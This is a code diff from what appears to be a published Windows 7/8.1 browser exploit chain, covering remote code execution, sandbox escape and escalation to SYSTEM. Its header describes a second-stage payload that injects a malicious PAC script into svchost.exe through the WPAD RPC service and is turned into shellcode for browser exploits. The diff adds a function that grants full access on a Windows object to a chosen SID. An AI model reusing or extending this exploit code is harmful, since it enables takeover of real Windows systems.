@@ -1,15 +1,16 @@
 /*
+________                 ___.    .__                 _________  __
+\______ \    ____   __ __\_ |__  |  |    ____       /   _____/_/  |_ _____  _______
+ |    |  \  /  _ \ |  |  \| __ \ |  |  _/ __ \      \_____  \ \   __\\__  \ \_  __ \
+ |    `   \(  <_> )|  |  /| \_\ \|  |__\  ___/      /        \ |  |   / __ \_|  | \/
+/_______  / \____/ |____/ |___  /|____/ \___  >    /_______  / |__|  (____  /|__|
+        \/                    \/            \/             \/             \/
+Windows 7/8.1 IE/Firefox RCE -> Sandbox Escape -> SYSTEM EoP Exploit Chain
 
- __      ____________  _____  ________      _________                  .______.                  ___________
-/  \    /  \______   \/  _  \ \______ \    /   _____/____    ____    __| _/\_ |__   _______  ___ \_   _____/ ______ ____ _____  ______   ____
-\   \/\/   /|     ___/  /_\  \ |    |  \   \_____  \\__  \  /    \  / __ |  | __ \ /  _ \  \/  /  |    __)_ /  ___// ___\\__  \ \____ \_/ __ \
- \        / |    |  /    |    \|    `   \  /        \/ __ \|   |  \/ /_/ |  | \_\ (  <_> >    <   |        \\___ \\  \___ / __ \|  |_> >  ___/
-  \__/\  /  |____|  \____|__  /_______  / /_______  (____  /___|  /\____ |  |___  /\____/__/\_ \ /_______  /____  >\___  >____  /   __/ \___  >
-       \/                   \/        \/          \/     \/     \/      \/      \/            \/         \/     \/     \/     \/|__|        \/ 
- Second stage payload - WPAD RPC client to inject malicious PAC JS file into svchost.exe (LOCAL SERVICE)
+Second stage payload - WPAD RPC client to inject malicious PAC JS file into svchost.exe (LOCAL SERVICE)
 
- This component of the chain will be compiled as a DLL and converted into a shellcode prior to be encoded
- in JS and planted into one of the live Firefox or Internet Explorer RCE.
+This component of the chain will be compiled as a DLL and converted into a shellcode prior to be encoded
+in JS and planted into one of the live Firefox or Internet Explorer RCE.
 
 */
 
@@ -17,11 +18,11 @@
 #include <stdio.h>
 #include <stdint.h>
 #include <AclAPI.h>
+
 #include "IWinHttpAutoProxySvc_h.h"
 
 #pragma comment(lib, "rpcrt4.lib")
-
-BOOL SetObjectAclAllAccess(HANDLE hObject, wchar_t* SID, SE_OBJECT_TYPE ObjectType);
+#pragma comment(lib, "AdvAPI32.lib")
 
 ////////
 ////////
@@ -68,15 +69,41 @@ void DebugLog(const wchar_t* Format, ...) {
 
 ////////
 ////////
-// RPC helpers
+// ACL manipulation logic
 ////////
 
-void __RPC_FAR* __RPC_USER midl_user_allocate(size_t cBytes) { // https://docs.microsoft.com/en-us/windows/desktop/Rpc/the-midl-user-allocate-function
-    return((void __RPC_FAR*) malloc(cBytes));
-}
+BOOL SetObjectAclAllAccess(HANDLE hObject, wchar_t* SID, SE_OBJECT_TYPE ObjectType) {
+    PACL pDacl = NULL, pNewDACL = NULL;
+    EXPLICIT_ACCESSW ExplicitAccess = { 0 };
+    PSECURITY_DESCRIPTOR pSecurityDescriptor = NULL;
+    PSID pSID = NULL;
+    BOOL bSuccess = FALSE;
+    uint32_t dwError;
 
-void __RPC_USER midl_user_free(void __RPC_FAR* ptr) { // https://docs.microsoft.com/en-us/windows/desktop/Rpc/the-midl-user-free-function
-    free(ptr);
+    if ((dwError = GetSecurityInfo(hObject, ObjectType, DACL_SECURITY_INFORMATION, NULL, NULL, &pDacl, NULL, &pSecurityDescriptor)) == ERROR_SUCCESS) {
+        if (ConvertStringSidToSidW(SID, &pSID)) {
+            ExplicitAccess.grfAccessMode = SET_ACCESS;
+            ExplicitAccess.grfAccessPermissions = GENERIC_ALL;
+            ExplicitAccess.grfInheritance = CONTAINER_INHERIT_ACE | OBJECT_INHERIT_ACE;
+            ExplicitAccess.Trustee.MultipleTrusteeOperation = NO_MULTIPLE_TRUSTEE;
+            ExplicitAccess.Trustee.pMultipleTrustee = NULL;
+            ExplicitAccess.Trustee.ptstrName = pSID;
+            ExplicitAccess.Trustee.TrusteeForm = TRUSTEE_IS_SID;
+            ExplicitAccess.Trustee.TrusteeType = TRUSTEE_IS_UNKNOWN;
+
+            if ((dwError = SetEntriesInAclW(1, &ExplicitAccess, pDacl, &pNewDACL)) == ERROR_SUCCESS) {
+                if ((dwError = SetSecurityInfo(hObject, ObjectType, DACL_SECURITY_INFORMATION, NULL, NULL, pNewDACL, NULL)) == ERROR_SUCCESS) {
+                    bSuccess = TRUE;
+                }
+
+                LocalFree(pNewDACL);
+            }
+        }
+
+        LocalFree(pSID);
+    }
+
+    return bSuccess;
 }
 
 ////////
